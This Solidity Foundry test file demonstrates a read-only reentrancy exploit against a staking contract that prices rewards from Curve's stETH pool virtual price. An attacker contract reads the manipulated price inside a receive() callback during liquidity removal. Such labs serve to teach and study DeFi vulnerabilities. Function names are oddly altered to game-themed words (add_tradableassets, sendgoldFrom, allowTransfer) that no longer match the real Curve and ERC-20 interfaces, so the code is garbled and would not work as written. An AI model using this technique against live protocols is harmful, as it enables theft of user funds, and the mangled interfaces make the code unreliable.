// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function get_virtual_price() external view returns (uint);

    function add_tradableassets(
        uint[2] calldata amounts,
        uint min_forgeweapon_amount
    ) external payable returns (uint);

    function remove_availablegold(
        uint lp,
        uint[2] calldata min_amounts
    ) external returns (uint[2] memory);

    function remove_freeitems_one_coin(
        uint lp,
        int128 i,
        uint min_amount
    ) external returns (uint);
}

address constant steth_prizepool = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_gamecoin = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token

// CoreContract
// users stake LP_TOKEN
// getReward rewards the users based on the current price of the pool LP token
contract CoreContract {
    IERC20 public constant questToken = IERC20(lp_gamecoin);
    ICurve private constant rewardPool = ICurve(steth_prizepool);

    mapping(address => uint) public gemtotalOf;

    function pledgePower(uint amount) external {
        questToken.sendgoldFrom(msg.sender, address(this), amount);
        gemtotalOf[msg.sender] += amount;
    }

    function releasePledge(uint amount) external {
        gemtotalOf[msg.sender] -= amount;
        questToken.shareTreasure(msg.sender, amount);
    }

    function getLootreward() external view returns (uint) {
        //rewarding tokens based on the current virtual price of the pool LP token
        uint lootReward = (gemtotalOf[msg.sender] * rewardPool.get_virtual_price()) /
            1 ether;
        // Omitting code to transfer reward tokens
        return lootReward;
    }
}

contract OperatorContract {
    ICurve private constant rewardPool = ICurve(steth_prizepool);
    IERC20 public constant lpRealmcoin = IERC20(lp_gamecoin);
    CoreContract private immutable target;

    constructor(address _target) {
        target = CoreContract(_target);
    }

    // Stake LP into CoreContract
    function commitgemsTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = rewardPool.add_tradableassets{value: msg.value}(amounts, 1);
        console.log(
            "LP token price after staking into CoreContract",
            rewardPool.get_virtual_price()
        );

        lpRealmcoin.allowTransfer(address(target), lp);
        target.pledgePower(lp);
    }

    function performReadOnlyCallback() external payable {
        // Add liquidity to Curve
        uint[2] memory amounts = [msg.value, 0];
        uint lp = rewardPool.add_tradableassets{value: msg.value}(amounts, 1);
        // Log get_virtual_price
        console.log(
            "LP token price before remove_liquidity()",
            rewardPool.get_virtual_price()
        );
        // Remove liquidity from Curve
        // remove_liquidity() invokes the recieve() callback
        uint[2] memory min_amounts = [uint(0), uint(0)];
        rewardPool.remove_availablegold(lp, min_amounts);
        // Log get_virtual_price
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            rewardPool.get_virtual_price()
        );

        uint lootReward = target.getLootreward();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", lootReward);
    }

    receive() external payable {
        // receive() is called when the remove_liquidity is called
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            rewardPool.get_virtual_price()
        );

        uint lootReward = target.getLootreward();
        console.log("Reward if Read-Only Reentrancy is invoked: ", lootReward);
    }
}

contract OperatorTest is Test {
    OperatorContract public execute;
    CoreContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new CoreContract();
        execute = new OperatorContract(address(target));
    }

    function testExecution() public {
        execute.commitgemsTokens{value: 10 ether}(); // stake 10 eth in CoreContract
        execute.performReadOnlyCallback{value: 100000 ether}();
    }
}
